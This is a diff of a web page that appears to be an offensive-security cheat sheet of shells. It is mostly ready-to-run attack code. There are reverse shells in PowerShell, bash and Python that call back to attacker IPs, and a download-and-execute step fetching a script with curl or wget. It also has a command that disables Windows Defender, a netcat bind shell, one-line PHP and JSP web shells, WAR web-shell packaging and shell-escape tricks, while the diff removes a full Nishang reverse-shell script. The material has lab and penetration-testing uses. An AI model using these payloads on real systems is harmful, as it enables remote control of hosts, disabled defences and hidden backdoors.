@@ -75,122 +75,9 @@
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient('10.10.15.60',443);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + 'PS ' + (pwd).Path + '&gt; ';</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()"</span><span class="w">
 </span></code></pre></div></div>
 
-<pre><code class="language-ps1">function Invoke-PowerShellTcp 
-{ 
-&lt;#
-.SYNOPSIS
-Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
-.DESCRIPTION
-This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
-Also, a standard Netcat can connect to this script Bind to a specific port.
-The script is derived from Powerfun written by Ben Turner &amp; Dave Hardy
-.PARAMETER IPAddress
-The IP address to connect to when using the -Reverse switch.
-.PARAMETER Port
-The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
-.EXAMPLE
-PS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
-Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
-the given IP and port. 
-.EXAMPLE
-PS &gt; Invoke-PowerShellTcp -Bind -Port 4444
-Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
-.EXAMPLE
-PS &gt; Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
-Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
-listening on the given IP and port. 
-.LINK
-http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
-https://github.com/nettitude/powershell/blob/master/powerfun.ps1
-https://github.com/samratashok/nishang
-#&gt;      
-    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
-
-        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
-        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
-        [String]
-        $IPAddress,
-
-        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
-        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
-        [Int]
-        $Port,
-
-        [Parameter(ParameterSetName="reverse")]
-        [Switch]
-        $Reverse,
-
-        [Parameter(ParameterSetName="bind")]
-        [Switch]
-        $Bind
-
-    )
-
-    
-    try 
-    {
-        #Connect back if the reverse switch is used.
-        if ($Reverse)
-        {
-            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
-        }
-
-        #Bind to the provided port if Bind switch is used.
-        if ($Bind)
-        {
-            $listener = [System.Net.Sockets.TcpListener]$Port
-            $listener.start()    
-            $client = $listener.AcceptTcpClient()
-        } 
-
-        $stream = $client.GetStream()
-        [byte[]]$bytes = 0..65535|%{0}
-
-        #Send back current username and computername
-        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
-        $stream.Write($sendbytes,0,$sendbytes.Length)
-
-        #Show an interactive PowerShell prompt
-        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&gt;')
-        $stream.Write($sendbytes,0,$sendbytes.Length)
-
-        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
-        {
-            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
-            $data = $EncodedText.GetString($bytes,0, $i)
-            try
-            {
-                #Execute the command on the target.
-                $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String )
-            }
-            catch
-            {
-                Write-Warning "Something went wrong with execution of command on the target." 
-                Write-Error $_
-            }
-            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&gt; '
-            $x = ($error[0] | Out-String)
-            $error.clear()
-            $sendback2 = $sendback2 + $x
-
-            #Return the results
-            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-            $stream.Write($sendbyte,0,$sendbyte.Length)
-            $stream.Flush()  
-        }
-        $client.Close()
-        if ($listener)
-        {
-            $listener.Stop()
-        }
-    }
-    catch
-    {
-        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
-        Write-Error $_
-    }
-}
-</code></pre>
+<ul>
+  <li>https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</li>
+</ul>
 
 <h3 id="disable-av">Disable AV</h3>
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableRealtimeMonitoring</span><span class="w"> </span><span class="bp">$true</span><span class="w">
@@ -204,18 +91,17 @@ sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14
 </code></pre></div></div>
 
 <h3 id="execute-reverse-shell-file">Execute Reverse Shell File</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># CI or Webshell</span>
-<span class="c">## Transfir File to Target</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Transfir File to Target</span>
 <span class="nv">$ </span>curl &lt;MY_IP&gt;:&lt;MY_PORT&gt;/bash.sh <span class="nt">-o</span> /tmp/bash.sh
 <span class="nv">$ </span>wget &lt;MY_IP&gt;:&lt;MY_PORT&gt;/bash.sh 
 
-<span class="c">## Execute Shell</span>
+<span class="c"># Execute Shell</span>
 <span class="nv">$ </span>./tmp/bash.sh
 <span class="nv">$ </span>bash /tmp/bash.sh
 </code></pre></div></div>
 
 <h2 id="pyton">Pyton</h2>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'</span>
 </code></pre></div></div>
 
 <h2 id="upload-php-file-that-works-like-a-page">Upload PHP file that works like a page</h2>
@@ -234,6 +120,8 @@ sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14
 <span class="nv">$ </span>bash <span class="nt">-c</span> <span class="s1">'sh -i &gt;%26 /dev/tcp/10.10.14.5/9999 0&gt;%261'</span><span class="sb">`</span>
 </code></pre></div></div>
 
+<hr />
+
 <h1 id="bind-shells">Bind Shells</h1>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash
 <span class="nv">$ </span><span class="nb">rm</span> <span class="nt">-f</span> /tmp/f<span class="p">;</span> <span class="nb">mkfifo</span> /tmp/f<span class="p">;</span> <span class="nb">cat</span> /tmp/f | /bin/bash <span class="nt">-i</span> 2&gt;&amp;1 | nc <span class="nt">-l</span> 10.129.41.200 7777 <span class="o">&gt;</span> /tmp/f
@@ -242,12 +130,21 @@ sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14
 <span class="nv">$ </span>nc <span class="nt">-nv</span> 10.129.41.200 7777
 </code></pre></div></div>
 
-<h1 id="web-shell"><a href="https://github.com/jbarcia/Web-Shells/tree/master/laudanum">WEB SHELL</a></h1>
+<hr />
+
+<h1 id="web-shells"><a href="https://github.com/jbarcia/Web-Shells/tree/master/laudanum">Web Shells</a></h1>
 <p><code class="language-plaintext highlighter-rouge">/usr/share/laudanum</code></p>
 
 <h2 id="php"><a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell">PHP</a></h2>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php SYSTEM<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span> ?&gt;
 </code></pre></div></div>
+
+<h2 id="aspx-antak-webshell"><a href="https://github.com/samratashok/nishang/tree/master/Antak-WebShell">ASPX Antak Webshell</a></h2>
+<p><code class="language-plaintext highlighter-rouge">/usr/share/nishang/Antak-WebShell</code></p>
+
+<blockquote>
+  <p>Antak is a web shell built-in ASP.Net. Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server.</p>
+</blockquote>
 
 <h2 id="jsp">JSP</h2>
 <div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">));</span> <span class="nt">%&gt;</span>
@@ -258,15 +155,13 @@ sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14
 </code></pre></div></div>
 
 <h2 id="war"><a href="https://github.com/BustedSec/webshell/blob/master/webshell.war">War</a></h2>
-<p>java/war (Tomcat, Axis2, or WebLogic)</p>
+<blockquote>
+  <p>java/war (Tomcat, Axis2, or WebLogic)</p>
+</blockquote>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
 <span class="nv">$ </span>zip <span class="nt">-r</span> backup.war cmd.jsp 
 </code></pre></div></div>
-<h2 id="antak-webshell"><a href="https://github.com/samratashok/nishang/tree/master/Antak-WebShell">Antak Webshell</a></h2>
-<p><code class="language-plaintext highlighter-rouge">/usr/share/nishang/Antak-WebShell</code></p>
-
-<p>Antak is a web shell built-in ASP.Net. Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server.</p>
 
 <h2 id="upgrade-shell">Upgrade Shell</h2>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
@@ -276,42 +171,44 @@ export </span><span class="nv">TERM</span><span class="o">=</span>xterm
 </code></pre></div></div>
 
 <h2 id="interactive-shells">Interactive Shells</h2>
-<p><strong>/bin/sh -i</strong></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/sh -i
-</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># /bin/sh -i</span>
+/bin/sh <span class="nt">-i</span>
 
-<p><strong>Perl</strong></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl —e 'exec "/bin/sh";
-perl: exec "/bin/sh";
-</code></pre></div></div>
+<span class="c"># Perl</span>
+perl —e <span class="s1">'exec "/bin/sh";'</span>
 
-<p><strong>Ruby</strong></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ruby: exec "/bin/sh"
-</code></pre></div></div>
+<span class="c">## The command should be run from a script.</span>
+perl: <span class="nb">exec</span> <span class="s2">"/bin/sh"</span><span class="p">;</span>
 
-<p><strong>Lua</strong></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lua: os.execute('/bin/sh')
-</code></pre></div></div>
 
-<p><strong>AWK</strong></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>awk 'BEGIN {system("/bin/sh")}'
-</code></pre></div></div>
+<span class="c"># Ruby</span>
+<span class="c">## The command should be run from a script.</span>
+ruby: <span class="nb">exec</span> <span class="s2">"/bin/sh"</span>
 
-<p><strong>Find</strong></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
-</code></pre></div></div>
 
-<p><strong>Using Exec To Launch A Shell</strong></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find . -exec /bin/sh \; -quit
-</code></pre></div></div>
+<span class="c"># Lua</span>
+<span class="c">## The command should be run from a script.</span>
+lua: os.execute<span class="o">(</span><span class="s1">'/bin/sh'</span><span class="o">)</span>
 
-<p><strong>VIM</strong></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim -c ':!/bin/sh'
-</code></pre></div></div>
 
-<p><strong>Vim Escape</strong></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim
-:set shell=/bin/sh
+<span class="c"># AWK</span>
+<span class="nb">awk</span> <span class="s1">'BEGIN {system("/bin/sh")}'</span>
+
+
+<span class="c"># Find</span>
+find / <span class="nt">-name</span> nameoffile <span class="nt">-exec</span> /bin/awk <span class="s1">'BEGIN {system("/bin/sh")}'</span> <span class="se">\;</span>
+
+
+<span class="c"># Using Exec To Launch A Shell</span>
+find <span class="nb">.</span> <span class="nt">-exec</span> /bin/sh <span class="se">\;</span> <span class="nt">-quit</span>
+
+<span class="c"># VIM</span>
+vim <span class="nt">-c</span> <span class="s1">':!/bin/sh'</span>
+
+
+<span class="c"># Vim Escape</span>
+vim
+:set <span class="nv">shell</span><span class="o">=</span>/bin/sh
 :shell
 </code></pre></div></div>
 
